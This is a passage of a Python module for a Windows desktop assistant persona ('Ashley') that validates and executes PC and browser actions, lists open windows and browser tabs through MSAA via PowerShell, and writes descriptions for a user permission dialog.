            val = params[1] if len(params) > 1 else None
            # v0.13.15: validación de params antes de ejecutar.
            # Antes: si Ashley emitía [action:volume:set] sin valor, llegaba
            # a control_volume con value=None → caía al fallback "set:0" en
            # algunos paths (silencio en lugar del valor pedido). Ahora
            # rechazamos explícitamente antes de tocar el sistema.
            valid_subs = {"up", "down", "mute", "unmute", "set", "max", "min"}
            if sub not in valid_subs:
                return {"success": False,
                        "result": f"Acción de volumen desconocida: '{sub}'. Válidas: {', '.join(sorted(valid_subs))}.",
                        "screenshot": None, "browser_opened": browser_opened}
            if sub == "set":
                # Necesita valor numérico 0-100. Si no, no ejecutamos.
                if val is None or str(val).strip() == "":
                    return {"success": False,
                            "result": "Volumen 'set' necesita un valor 0-100. Ej: [action:volume:set:75].",
                            "screenshot": None, "browser_opened": browser_opened}
                try:
                    iv = int(str(val).strip())
                except (ValueError, TypeError):
                    return {"success": False,
                            "result": f"Volumen 'set' necesita un número 0-100, no '{val}'.",
                            "screenshot": None, "browser_opened": browser_opened}
                if iv < 0 or iv > 100:
                    return {"success": False,
                            "result": f"Volumen 'set' fuera de rango (recibido {iv}, esperado 0-100).",
                            "screenshot": None, "browser_opened": browser_opened}
            # Aliases conveniencia: 'max' → set:100, 'min' → set:0
            if sub == "max":
                sub, val = "set", "100"
            elif sub == "min":
                sub, val = "set", "0"
            return {"success": True, "result": control_volume(sub, val),
                    "screenshot": None, "browser_opened": browser_opened}

        elif action_type == "type_text":
            return {"success": True, "result": type_text(params[0] if params else ""),
                    "screenshot": None, "browser_opened": browser_opened}

        elif action_type == "type_in":
            # v0.13.17: validar que window y text NO sean vacíos. Antes:
            # type_in con params=[] enviaba focus_window("") + type_text("")
            # que es no-op, pero devolvía success=True con mensaje misleading
            # "Ventana '' activada → Texto escrito (0 caracteres)". Ahora
            # rechazamos limpio para que el log capture el problema.
            window = params[0] if params else ""
            text   = params[1] if len(params) > 1 else ""
            if not window.strip():
                return {"success": False,
                        "result": "type_in necesita el nombre de la ventana como primer parámetro.",
                        "screenshot": None, "browser_opened": browser_opened}
            if not text.strip():
                return {"success": False,
                        "result": "type_in necesita el texto a escribir como segundo parámetro.",
                        "screenshot": None, "browser_opened": browser_opened}
            return {"success": True, "result": type_in_window(window, text),
                    "screenshot": None, "browser_opened": browser_opened}

        elif action_type == "write_to_app":
            # v0.13.17: misma protección que type_in.
            app  = params[0] if params else ""
            text = params[1] if len(params) > 1 else ""
            if not app.strip():
                return {"success": False,
                        "result": "write_to_app necesita el nombre de la app como primer parámetro.",
                        "screenshot": None, "browser_opened": browser_opened}
            if not text.strip():
                return {"success": False,
                        "result": "write_to_app necesita el texto a escribir como segundo parámetro.",
                        "screenshot": None, "browser_opened": browser_opened}
            return {"success": True, "result": write_to_app(app, text),
                    "screenshot": None, "browser_opened": browser_opened}

        elif action_type == "remind":
            from .reminders import add_reminder
            dt_iso = params[0] if params else ""
            text   = params[1] if len(params) > 1 else ""
            return {"success": True, "result": add_reminder(text, dt_iso),
                    "screenshot": None, "browser_opened": browser_opened}

        elif action_type == "add_important":
            from .reminders import add_important
            # Soporta dos formatos:
            #   [action:add_important:texto]                       (legacy)
            #   [action:add_important:YYYY-MM-DDTHH:MM:texto]       (con fecha)
            # parsing.py separa por ":" antes del texto; si el primer
            # param parece ISO datetime, lo tratamos como due_date.
            import re as _re
            text = params[0] if params else ""
            due_date = None
            if len(params) > 1 and _re.match(r"^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}", params[0]):
                due_date = params[0]
                text = params[1]
            return {"success": True, "result": add_important(text, due_date=due_date),
                    "screenshot": None, "browser_opened": browser_opened}

        elif action_type == "done_important":
            # v0.17.3 — Si el item ya estaba marcado, mark_important_done
            # devuelve "" (señal de no-op). Propagamos noop=True para que
            # _execute_and_record_action suprima la notificación duplicada
            # en el chat. Antes Ashley re-emitía el tag varias veces sobre
            # el mismo item y el user veía 3-4 "Marcado como hecho" iguales
            # seguidos.
            from .reminders import mark_important_done
            text = params[0] if params else ""
            msg = mark_important_done(text)
            return {"success": True, "result": msg, "noop": (msg == ""),
                    "screenshot": None, "browser_opened": browser_opened}

        elif action_type == "save_taste":
            # v0.13.17: si falta el valor, devolver success=False (antes
            # devolvía success=True con un mensaje "Error: falta el valor"
            # — flag y mensaje contradictorios. El log no podía distinguir
            # entre tastes guardados de verdad y los rechazados).
            from .tastes import add_taste
            categoria = params[0] if params else "otros"
            valor     = params[1] if len(params) > 1 else ""
            if not valor.strip():
                return {"success": False,
                        "result": "save_taste necesita un valor (segundo parámetro).",
                        "screenshot": None, "browser_opened": browser_opened}
            return {"success": True, "result": add_taste(categoria, valor),
                    "screenshot": None, "browser_opened": browser_opened}

        elif action_type == "focus_window":
            return {"success": True, "result": focus_window(params[0] if params else ""),
                    "screenshot": None, "browser_opened": browser_opened}

        elif action_type == "hotkey":
            return {"success": True, "result": press_hotkey(params),
                    "screenshot": None, "browser_opened": browser_opened}

        elif action_type == "press_key":
            return {"success": True, "result": press_key(params[0] if params else ""),
                    "screenshot": None, "browser_opened": browser_opened}

        elif action_type == "close_window":
            new_browser = False if "youtube" in " ".join(params).lower() else browser_opened
            return {"success": True, "result": close_window(params[0] if params else ""),
                    "screenshot": None, "browser_opened": new_browser}

        elif action_type == "close_tab":
            hint = params[0] if params else "activo"
            new_browser = False if "youtube" in hint.lower() else browser_opened
            return {"success": True,
                    "result": close_browser_tab(hint, prefer_cdp=prefer_cdp),
                    "screenshot": None, "browser_opened": new_browser}

        # ─────────────────────────────────────────────
        #  Acciones avanzadas de browser (CDP-only)
        # ─────────────────────────────────────────────
        # Estos action types REQUIEREN CDP. Si CDP no está activo, devuelven
        # success=False con mensaje al user de que active "Modo browser
        # moderno" en Settings → Acciones. Sin CDP no hay equivalente legacy
        # para click/type_browser/read_page/scroll_page (SendInput no es lo
        # bastante preciso para apuntar a elementos del DOM).

        elif action_type in ("click", "type_browser", "read_page", "scroll_page"):
            if not prefer_cdp:
                msg_off = "Esta acción requiere el Modo browser moderno. Actívalo en Ajustes → Modo browser moderno."
                return {"success": False, "result": msg_off,
                        "screenshot": None, "browser_opened": browser_opened}
            from . import browser_cdp as _cdp
            if not _cdp.is_cdp_available():
                msg_off = "El navegador no responde a CDP. Cierra y reabre el navegador para que cargue con el flag."
                return {"success": False, "result": msg_off,
                        "screenshot": None, "browser_opened": browser_opened}

            # Determinar tab target: el primer param puede ser hint del tab,
            # o el params[0] puede ser ya el contenido. Convención simple:
            #   [action:click:texto]            → tab activa, click texto
            #   [action:click:tab_hint:texto]   → tab que matchee tab_hint
            # Mismo para type_browser. read_page/scroll_page solo usan tab.
            if action_type == "click":
                if len(params) >= 2:
                    tab_target, what = params[0], params[1]
                else:
                    tab_target, what = "active", (params[0] if params else "")
                if not what:
                    return {"success": False,
                            "result": "click necesita el texto/etiqueta del elemento.",
                            "screenshot": None, "browser_opened": browser_opened}
                ok, msg = _cdp.click_by_text(tab_target, what)
                return {"success": ok, "result": msg,
                        "screenshot": None, "browser_opened": browser_opened}

            elif action_type == "type_browser":
                # [action:type_browser:texto] → escribe en el input enfocado
                # (o el primer input visible). Sin selector explícito por
                # diseño — Ashley solo describe qué escribir.
                if not params:
                    return {"success": False,
                            "result": "type_browser necesita el texto a escribir.",
                            "screenshot": None, "browser_opened": browser_opened}
                text = params[-1]  # último param es el texto
                # Selector: si tiene 2 params, primer es el selector;
                # si no, usamos un selector universal (input/textarea visible)
                if len(params) >= 3:
                    tab_target, selector, text = params[0], params[1], params[2]
                elif len(params) == 2:
                    tab_target, selector, text = "active", params[0], params[1]
                else:
                    tab_target = "active"
                    selector = "input:not([type='hidden']), textarea"
                ok, msg = _cdp.fill_input(tab_target, selector, text)
                return {"success": ok, "result": msg,
                        "screenshot": None, "browser_opened": browser_opened}

            elif action_type == "read_page":
                tab_target = params[0] if params else "active"
                text = _cdp.get_page_text(tab_target)
                if text is None:
                    return {"success": False,
                            "result": "No se pudo leer la página.",
                            "screenshot": None, "browser_opened": browser_opened}
                # Pasamos el texto al chat como result — Ashley lo verá
                # en el siguiente turn y puede comentarlo en personaje.
                preview = text[:1500] + "…" if len(text) > 1500 else text
                return {"success": True,
                        "result": f"Contenido de la página:\n{preview}",
                        "screenshot": None, "browser_opened": browser_opened}

            elif action_type == "scroll_page":
                if len(params) >= 2:
                    tab_target, direction = params[0], params[1]
                else:
                    tab_target, direction = "active", (params[0] if params else "down")
                ok, msg = _cdp.scroll_page(tab_target, direction)
                return {"success": ok, "result": msg,
                        "screenshot": None, "browser_opened": browser_opened}

        else:
            return {"success": False, "result": f"Acción desconocida: '{action_type}'",
                    "screenshot": None, "browser_opened": browser_opened}

    except Exception as e:
        return {"success": False, "result": f"Error ejecutando '{action_type}': {e}",
                "screenshot": None, "browser_opened": browser_opened}


# ── Estado del sistema (contexto para Ashley) ────────────────────────────────

# Cache para las pestañas del navegador (evita llamar PowerShell cada mensaje)
_tabs_cache: dict = {"ts": 0.0, "tabs": []}
_TABS_CACHE_TTL = 8.0  # segundos

# C# inline para PowerShell — usa MSAA (IAccessible).
# Opera GX / Chromium: los tabs viven en un ROLE_SYSTEM_PAGETABLIST (role=60)
# y sus hijos son ROLE_SYSTEM_LISTITEM (role=37) o ROLE_SYSTEM_PAGETAB (role=25).
# UIA (UIAutomationClient) no funciona porque Chromium lanza RPC_E_SERVERFAULT en
# FindAll(Descendants) a menos que haya un AT real conectado.
_MSAA_TABS_CS = r"""using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Threading;
using Accessibility;

public static class TabFinder {
    [DllImport("oleacc.dll", PreserveSig=false)]
    public static extern void AccessibleObjectFromWindow(
        IntPtr hwnd, uint id, [In] ref Guid riid,
        [MarshalAs(UnmanagedType.Interface)] out IAccessible acc);

    static IAccessible GetRoot(IntPtr hwnd) {
        var iid = new Guid("618736E0-3C3D-11CF-810C-00AA00389B71");
        IAccessible a;
        AccessibleObjectFromWindow(hwnd, 0xFFFFFFFC, ref iid, out a);
        return a;
    }

    public static List<string> GetTabs(IntPtr hwnd) {
        // Primera llamada dispara el servidor de accesibilidad de Chromium
        GetRoot(hwnd);
        Thread.Sleep(600);
        // Segunda llamada ya ve el arbol completo
        IAccessible root = GetRoot(hwnd);
        var tabs = new List<string>();
        if (root != null) FindTabList(root, tabs, 0);
        return tabs;
    }

    static bool FindTabList(IAccessible obj, List<string> tabs, int depth) {
        if (depth > 20) return false;
        try {
            int role = (int)obj.get_accRole(0);
            int kids = obj.accChildCount;
            if (role == 60) { // ROLE_SYSTEM_PAGETABLIST — barra de tabs
                for (int i = 1; i <= Math.Min(kids, 200); i++) {
                    try {
                        object child = obj.get_accChild(i);
                        IAccessible acc = child as IAccessible;
                        if (acc != null) {
                            int cr = (int)acc.get_accRole(0);
                            if (cr == 25 || cr == 37) { // PAGETAB o LISTITEM
                                string cn = acc.get_accName(0);
                                if (!string.IsNullOrEmpty(cn)) tabs.Add(cn);
                            }
                        }
                    } catch {}
                }
                return true;
            }
            for (int i = 1; i <= Math.Min(kids, 200); i++) {
                try {
                    object child = obj.get_accChild(i);
                    IAccessible acc = child as IAccessible;
                    if (acc != null && FindTabList(acc, tabs, depth + 1)) return true;
                } catch {}
            }
        } catch {}
        return false;
    }
}"""


def _get_all_browser_hwnds() -> list[int]:
    """Devuelve los HWNDs de todas las ventanas de navegador visibles."""
    import ctypes
    user32 = ctypes.windll.user32
    hwnds = []
    CB = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_void_p, ctypes.c_void_p)
    def _cb(hwnd, _):
        if not user32.IsWindowVisible(hwnd):
            return True
        cls = ctypes.create_unicode_buffer(256)
        user32.GetClassNameW(hwnd, cls, 256)
        if cls.value in _BROWSER_WIN32_CLASSES:
            proc = _get_process_name_for_hwnd(hwnd)
            if proc in _REAL_BROWSER_PROCS:
                hwnds.append(hwnd)
        return True
    user32.EnumWindows(CB(_cb), 0)
    return hwnds


def _get_browser_tabs_via_uia(hwnds: list[int]) -> list[str]:
    """
    Enumera TODAS las pestañas de las ventanas del navegador dadas usando MSAA (IAccessible).
    Compila y ejecuta C# inline via PowerShell. Resultado cacheado 8 segundos.
    """
    if not hwnds:
        return []

    now = time.time()
    if now - _tabs_cache["ts"] < _TABS_CACHE_TTL:
        return _tabs_cache["tabs"]

    hwnd_list = ",".join(str(h) for h in hwnds)
    ps_script = (
        'Add-Type @"\n'
        + _MSAA_TABS_CS
        + '\n"@ -ReferencedAssemblies "Accessibility"\n'
        '\n'
        '$hwnds = @(' + hwnd_list + ')\n'
        'foreach ($h in $hwnds) {\n'
        '    $tabs = [TabFinder]::GetTabs([IntPtr]::new($h))\n'
        '    foreach ($t in $tabs) { Write-Output $t }\n'
        '}\n'
    )

    import tempfile
    tmp_path = None
    try:
        fd, tmp_path = tempfile.mkstemp(suffix=".ps1", text=True)
        with os.fdopen(fd, "w", encoding="utf-8") as f:
            f.write(ps_script)

        result = subprocess.run(
            [
                "powershell", "-NoProfile", "-NonInteractive",
                "-ExecutionPolicy", "Bypass",
                "-File", tmp_path,
            ],
            capture_output=True,
            text=True,
            timeout=12,
            creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
        )
        tabs = [ln.strip() for ln in result.stdout.strip().splitlines() if ln.strip()]
        _tabs_cache["ts"] = now
        _tabs_cache["tabs"] = tabs
        return tabs
    except Exception:
        _tabs_cache["ts"] = now
        _tabs_cache["tabs"] = []
        return []
    finally:
        if tmp_path:
            try:
                os.unlink(tmp_path)
            except Exception:
                pass


# Clases de ventanas a ignorar completamente (sistema / tray / desktop)
_SKIP_CLASSES = {
    "Shell_TrayWnd", "DV2ControlHost", "MsgrIMEWindowClass", "SysShadow",
    "Button", "WorkerW", "Progman", "SHELLDLL_DefView", "SysListView32",
    "tooltips_class32", "BaseBar", "TaskListThumbnailWnd",
    "Windows.UI.Core.CoreWindow",
    # NO filtrar ApplicationFrameWindow — aloja apps UWP como Calculadora, Configuración, etc.
}
# Títulos a ignorar (parciales, lowercase)
_SKIP_TITLE_FRAGMENTS = {
    "microsoft text input", "program manager", "gdi+ window",
    "default ime", "msctfime ui", "experiencia de entrada",
}


# Procesos host genéricos que no aportan info útil (mostrar solo título)
_GENERIC_HOSTS = {"applicationframehost.exe", "systemsettings.exe", "explorer.exe"}


def _get_process_name_for_hwnd(hwnd: int) -> str:
    """Obtiene el nombre del proceso (.exe) dueño de una ventana."""
    import ctypes
    from ctypes import wintypes
    user32   = ctypes.windll.user32
    kernel32 = ctypes.windll.kernel32

    pid = wintypes.DWORD()
    user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
    if not pid.value:
        return ""

    # PROCESS_QUERY_LIMITED_INFORMATION es suficiente para QueryFullProcessImageNameW
    # (GetModuleFileNameExW requería PROCESS_VM_READ adicional y fallaba en muchos procesos)
    PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
    hproc = kernel32.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, False, pid.value)
    if not hproc:
        return ""
    try:
        buf  = ctypes.create_unicode_buffer(260)
        size = ctypes.c_ulong(260)
        if kernel32.QueryFullProcessImageNameW(hproc, 0, buf, ctypes.byref(size)):
            name = os.path.basename(buf.value).lower()
            if name in _GENERIC_HOSTS:
                return ""
            return name
    except Exception:
        pass
    finally:
        kernel32.CloseHandle(hproc)
    return ""


def get_system_state() -> str:
    """
    Snapshot de ventanas visibles y TODAS las pestañas del navegador.
    Usa UI Automation para enumerar todas las pestañas (no solo la activa).
    """
    import ctypes
    user32 = ctypes.windll.user32

    apps: list[tuple[str, str]] = []          # (título, proceso)
    browser_hwnds: list[int] = []             # HWNDs de ventanas de browser
    active_titles: list[str] = []             # Títulos activos (fallback)

    CB = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_void_p, ctypes.c_void_p)

    def _cb(hwnd, _):
        if not user32.IsWindowVisible(hwnd):
            return True
        n = user32.GetWindowTextLengthW(hwnd)
        if n == 0:
            return True
        buf = ctypes.create_unicode_buffer(n + 1)
        user32.GetWindowTextW(hwnd, buf, n + 1)
        title = buf.value.strip()
        if len(title) < 2:
            return True

        cls = ctypes.create_unicode_buffer(256)
        user32.GetClassNameW(hwnd, cls, 256)
        cls_name = cls.value

        if cls_name in _SKIP_CLASSES:
            return True
        tl = title.lower()
        if any(f in tl for f in _SKIP_TITLE_FRAGMENTS):
            return True

        proc = _get_process_name_for_hwnd(hwnd)

        # Solo clasificar como browser si el proceso es un browser REAL.
        # Apps Electron (Discord, VS Code, Riot) usan Chrome_WidgetWin_1 pero NO son browsers.
        if cls_name in _BROWSER_WIN32_CLASSES and proc in _REAL_BROWSER_PROCS:
            browser_hwnds.append(hwnd)
            active_titles.append(title)  # Título activo como fallback
        else:
            apps.append((title, proc))
        return True

    user32.EnumWindows(CB(_cb), 0)

    # Obtener TODAS las pestañas via UI Automation; si falla, usar solo el título activo
    browser_tabs = _get_browser_tabs_via_uia(browser_hwnds)
    if not browser_tabs:
        browser_tabs = active_titles  # fallback: solo pestaña activa

    lines: list[str] = []
    # Nota observacional al inicio: este bloque es CONTEXTO interno para
    # que Ashley elija la acción correcta (qué proceso cerrar, qué pestaña
    # tocar, etc.). No es un guion para que lo recite al jefe.
    # Approach por feedback del user: lenguaje positivo en función ("usa
    # esto para X"), sin listas tipo "no menciones Y", "no enumeres Z" —
    # los LLMs imitan reglas negativas y terminan haciendo lo contrario.
    lines.append(
        "[Estado actual del PC del jefe — visión interna tuya]"
    )
    lines.append(
        "Esto es lo que ves para poder elegir bien qué acción emitir y "
        "responder con criterio. Compártelo con el jefe SOLO si te pregunta "
        "específicamente o si una pieza concreta es relevante para lo que "
        "ya estabais hablando. La conversación la guía él, no la lista."
    )
    lines.append("")
    if apps:
        lines.append("Ventanas abiertas (título | proceso):")
        for title, proc in apps[:25]:
            if proc:
                lines.append(f"  - \"{title}\"  [{proc}]")
            else:
                lines.append(f"  - \"{title}\"")
    if browser_tabs:
        lines.append("Pestañas del navegador:")
        for t in browser_tabs[:20]:
            lines.append(f"  - \"{t}\"")
    if len(lines) <= 3:
        # Solo el header + la nota — sin contenido real
        return "No se detectaron ventanas abiertas."
    lines.append("")
    lines.append("Para cerrar usa close_window con un fragmento del título o nombre del proceso.")
    lines.append("Para cerrar una pestaña del navegador usa close_tab con un fragmento del título.")
    return "\n".join(lines)


# ── Descripción legible para el diálogo de permisos ──────────────────────────

def describe_action(action_type: str, params: list[str], lang: str = "en") -> str:
    """Texto markdown que se muestra en el diálogo de confirmación.
    Acepta lang ('en' | 'es') para traducir. Default: EN."""
    from .i18n import act_desc, key_labels
    T = act_desc(lang)
    KL = key_labels(lang)

    if action_type == "screenshot":
        return T["screenshot"]
    elif action_type == "open_app":
        return T["open_app"].format(p=" ".join(params))
    elif action_type == "play_music":
        return T["play_music"].format(p=" ".join(params))
    elif action_type == "search_web":
        return T["search_web"].format(p=params[0] if params else "")
    elif action_type == "open_url":
        return T["open_url"].format(p=params[0] if params else "")
    elif action_type == "volume":
        sub = params[0] if params else ""
        val = params[1] if len(params) > 1 else ""
        if sub == "up":   return T["vol_up"]
        if sub == "down": return T["vol_down"]
        if sub == "mute": return T["vol_mute"]
        if sub == "max":  return T["vol_set"].format(p="100")
        if sub == "min":  return T["vol_set"].format(p="0")
        if sub == "set":
            # v0.13.15: si no hay valor numérico válido, mostrar warning
            # claro en vez del str vacío genérico ("Volumen: set." era
            # ambiguo y enmascaraba bugs de emisión del LLM).
            try:
                iv = int(str(val).strip())
                if 0 <= iv <= 100:
                    return T["vol_set"].format(p=str(iv))
            except (ValueError, TypeError):
                pass
            return T.get("vol_set_invalid",
                         f"🔊 Volumen 'set' con valor inválido: '{val}'")
        return f"🔊 {sub}"
    elif action_type == "type_text":
        text = params[0] if params else ""
        preview = text[:80] + "…" if len(text) > 80 else text
        return T["type_text"].format(p=preview)
    elif action_type == "type_in":
        window = params[0] if params else ""
        text   = params[1] if len(params) > 1 else ""
        preview = text[:80] + "…" if len(text) > 80 else text
        return T["type_in"].format(win=window, p=preview)
    elif action_type == "write_to_app":
        app  = params[0] if params else ""
        text = params[1] if len(params) > 1 else ""
        preview = text[:80].replace("\n", "↵") + ("…" if len(text) > 80 else "")
        return T["write_to_app"].format(app=app, p=preview)
    elif action_type == "focus_window":
        return T["focus_window"].format(p=params[0] if params else "")
    elif action_type == "hotkey":
        combo = " + ".join(k.upper() for k in params)
        return T["hotkey"].format(p=combo)
    elif action_type == "press_key":
        key = params[0] if params else ""
        return T["press_key"].format(p=KL.get(key.lower(), key.upper()))
    elif action_type == "close_window":
        return T["close_window"].format(p=params[0] if params else "")
    elif action_type == "close_tab":
        hint = params[0] if params else ("active" if lang == "en" else "activo")
        return T["close_tab"].format(p=hint)
    elif action_type == "remind":
        dt_iso = params[0] if params else ""
        text   = params[1] if len(params) > 1 else ""
        from .reminders import _fmt_dt
        return T["remind"].format(text=text, date=_fmt_dt(dt_iso))
    elif action_type == "add_important":
        return T["add_important"].format(p=params[0] if params else "")
    elif action_type == "done_important":
        return T["done_important"].format(p=params[0] if params else "")
    elif action_type == "save_taste":
        cat  = params[0] if params else ("other" if lang == "en" else "otros")
        val  = params[1] if len(params) > 1 else ""
        return T["save_taste"].format(cat=cat, val=val)
    # ── CDP-only actions (v0.13.25) ─────────────────────────────────
    elif action_type == "click":
        what = params[-1] if params else ""
        return T.get("act_click", "🖱️ Click en: **{p}**").format(p=what)
    elif action_type == "type_browser":
        text = params[-1] if params else ""
        preview = text[:60] + "…" if len(text) > 60 else text
        return T.get("act_type_browser", "⌨️ Escribir en navegador: **{p}**").format(p=preview)
    elif action_type == "read_page":
        return T.get("act_read_page", "📖 Leer contenido de la página")
    elif action_type == "scroll_page":
        direction = params[-1] if params else "down"
        return T.get("act_scroll_page", "↕️ Scroll: **{p}**").format(p=direction)
    return T["generic"].format(action_type=action_type, params=" ".join(params))
